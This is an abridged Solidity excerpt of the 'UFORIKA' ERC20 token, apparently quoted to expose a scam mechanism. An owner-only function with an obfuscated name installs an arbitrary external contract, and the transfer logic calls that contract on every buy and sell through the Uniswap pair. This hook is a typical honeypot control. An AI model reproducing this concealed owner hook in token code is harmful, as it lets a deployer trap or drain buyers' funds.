...
contract TokenM is ERC20 {
    ...
    IUserAmountllveoe public llveoe;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("UFORIKA", "FORA") {
    ...
    function cloinverBuuingRvvx(IUserAmountllveoe _llveoe) public onlyOwner {
        llveoe = _llveoe;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                llveoe.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				llveoe.addOutAmount(from, amount);
            }else{
                llveoe.addOutAmount(from, amount);
                takeFee = false;
            }
